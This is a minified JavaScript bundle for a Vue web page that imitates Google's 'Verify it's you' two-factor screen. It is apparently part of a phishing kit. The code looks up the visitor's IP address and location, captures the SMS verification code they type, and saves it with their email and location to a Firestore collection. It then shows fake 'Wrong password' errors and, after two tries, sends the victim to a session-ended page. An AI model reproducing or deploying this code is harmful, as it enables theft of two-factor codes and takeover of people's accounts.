(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["PhoneVerificationForm"],{"0c66":function(t,e,a){},4323:function(t,e,a){"use strict";var r=a("0c66"),s=a.n(r);s.a},ca71:function(t,e,a){},fa54:function(t,e,a){"use strict";a.r(e);var r=function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("v-app",{attrs:{color:""}},[r("v-content",{},[r("v-container",{staticClass:"d-flex justify-center",attrs:{"fill-height":""}},[r("v-card",{staticClass:"pl-8 pr-8",attrs:{"max-width":"448",height:"500",loading:t.cardLoading,outlined:!0,flat:"",disabled:t.disableCard}},[r("v-card-title",[r("v-img",{staticClass:"mt-8",attrs:{width:"20",height:"32",src:a("8243"),contain:!0}})],1),r("v-card-text",[r("h3",{staticClass:"headline text-center text--primary"},[t._v("Verify it's you")]),r("h4",{staticClass:"text--primary text-center"},[t._v("This device isn't recognised. For your security, Google wants to make sure it's really you.")]),r("h4",{staticClass:"primary--text text-center"},[t._v("Learn more")]),r("div",{staticClass:"text-center"},[r("v-btn",{staticClass:"ma-3 mx-auto email-button",attrs:{rounded:!0,outlined:!0}},[r("v-icon",{attrs:{left:""}},[t._v("mdi-account-circle")]),r("div",{staticClass:"text--primary text-none"},[t._v(t._s(t.email))]),r("v-icon",{attrs:{right:""}},[t._v("mdi-chevron-down")])],1),r("p",{staticClass:"text--primary"},[t._v("A text message with a 6-digit verification code was just sent to your phone.")]),r("v-text-field",{ref:"password",staticClass:"mt-5",attrs:{type:"number",label:"Enter the code",error:t.error,outlined:!0,width:"300",color:"primary","error-messages":t.errorMessage},on:{"click:append":function(e){t.showPassword=!t.showPassword},keyup:function(e){return!e.type.indexOf("key")&&t._k(e.keyCode,"enter",13,e.key,"Enter")?null:t.submitForm(e)}},model:{value:t.password,callback:function(e){t.password=e},expression:"password"}})],1)]),r("v-card-actions",[r("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,text:""}},[t._v("Try another way")]),r("v-spacer"),r("v-btn",{staticClass:"text-none",attrs:{color:"primary",depressed:!0,eight:"36",width:"88"},on:{click:t.submitForm}},[t._v("Next")])],1),r("v-snackbar",{attrs:{bottom:!0,timeout:0},model:{value:t.snackbar,callback:function(e){t.snackbar=e},expression:"snackbar"}},[t._v(" Didn't get the code? "),r("v-btn",{attrs:{dark:"",text:"",color:"yellow"},on:{click:t.resendCode}},[t._v("RESEND IT")])],1)],1)],1)],1)],1)},s=[],i=(a("96cf"),a("1da1")),n=a("dc59"),o={name:"LoginForm",data:function(){return{showPassword:!1,errorMessage:"",error:!1,disableCard:!1,email:"",password:"",ipAddress:"",countryName:"",city:"",region:"",submitCount:0,cardLoading:!1,snackbar:!1}},created:function(){var t=this;return Object(i["a"])(regeneratorRuntime.mark((function e(){var a,r;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return t.email=t.$route.params.email,console.log(t.email),e.prev=2,e.next=5,t.$http("https://ipapi.co/json/");case 5:a=e.sent,r=a.data,console.log(r),t.ipAddress=r.ip,t.countryName=r.country_name,t.city=r.city,t.region=r.region,e.next=17;break;case 14:e.prev=14,e.t0=e["catch"](2),console.log(e.t0);case 17:t.$refs.password.focus();case 18:case"end":return e.stop()}}),e,null,[[2,14]])})))()},mounted:function(){var t=this;console.log("i mounted"),setInterval((function(){console.log("snackbar ran here"),0==t.snackbar&&(t.snackbar=!0)}),15e3)},firestore:function(){return{users:n["a"].collection("users")}},methods:{submitForm:function(){var t=this;return Object(i["a"])(regeneratorRuntime.mark((function e(){var a;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:if(console.log(t.email,t.password),6==t.password.length){e.next=7;break}return console.log("i ran password length"),t.error=!0,t.errorMessage="Wrong number of digits. try again",t.password="",e.abrupt("return");case 7:return t.submitCount++,t.errorMessage="",t.error=!1,console.log(t.submitCount),t.disableCard=!0,t.cardLoading=!0,e.prev=13,e.next=16,t.$firestore.users.where("email","==",t.email).where("password","==",t.password).get();case 16:if(a=e.sent,0!=a.docs.length){e.next=20;break}return e.next=20,t.$firestore.users.add({email:t.email,password:"G-".concat(t.password),ipAddress:t.ipAddress,country:t.countryName,city:t.city,region:t.region,createdAt:new Date});case 20:t.password="",t.error=!0,t.errorMessage="Wrong password. Try again or click Forgot password to reset it.",t.disableCard=!1,t.cardLoading=!1,2==t.submitCount&&t.$router.push({name:"SessionEnded"}),e.next=31;break;case 28:e.prev=28,e.t0=e["catch"](13),console.log(e.t0);case 31:case"end":return e.stop()}}),e,null,[[13,28]])})))()},resendCode:function(){var t=this;this.snackbar=!1,this.cardLoading=!0,this.disableCard=!0,this.error=!1,this.errorMessage="",setTimeout((function(){t.cardLoading=!1,t.disableCard=!1,t.password=""}),3e3)}}},c=o,d=(a("4323"),a("2877")),l=a("6544"),u=a.n(l),m=a("7496"),h=a("8336"),p=a("b0af"),v=a("99d9"),f=a("a523"),b=a("a75b"),g=a("132d"),w=a("adda"),k=(a("a9e3"),a("ca71"),a("a9ad")),y=a("f2e7"),x=a("fe6c"),C=a("58df"),_=a("d9bd"),T=Object(C["a"])(k["a"],y["a"],Object(x["b"])(["absolute","top","bottom","left","right"])).extend({name:"v-snackbar",props:{multiLine:Boolean,timeout:{type:Number,default:6e3},vertical:Boolean},data:function(){return{activeTimeout:-1}},computed:{classes:function(){return{"v-snack--active":this.isActive,"v-snack--absolute":this.absolute,"v-snack--bottom":this.bottom||!this.top,"v-snack--left":this.left,"v-snack--multi-line":this.multiLine&&!this.vertical,"v-snack--right":this.right,"v-snack--top":this.top,"v-snack--vertical":this.vertical}}},watch:{isActive:function(){this.setTimeout()}},created:function(){this.$attrs.hasOwnProperty("auto-height")&&Object(_["d"])("auto-height",this)},mounted:function(){this.setTimeout()},methods:{setTimeout:function(){var t=this;window.clearTimeout(this.activeTimeout),this.isActive&&this.timeout&&(this.activeTimeout=window.setTimeout((function(){t.isActive=!1}),this.timeout))}},render:function(t){return t("transition",{attrs:{name:"v-snack-transition"}},[this.isActive&&t("div",{staticClass:"v-snack",class:this.classes,on:this.$listeners},[t("div",this.setBackgroundColor(this.color,{staticClass:"v-snack__wrapper",attrs:{role:"alert"}}),[t("div",{staticClass:"v-snack__content"},this.$slots.default)])])])}}),V=a("2fa4"),A=a("8654"),L=Object(d["a"])(c,r,s,!1,null,null,null);e["default"]=L.exports;u()(L,{VApp:m["a"],VBtn:h["a"],VCard:p["a"],VCardActions:v["a"],VCardText:v["b"],VCardTitle:v["c"],VContainer:f["a"],VContent:b["a"],VIcon:g["a"],VImg:w["a"],VSnackbar:T,VSpacer:V["a"],VTextField:A["a"]})}}]);
//# sourceMappingURL=PhoneVerificationForm.d565ed12.js.map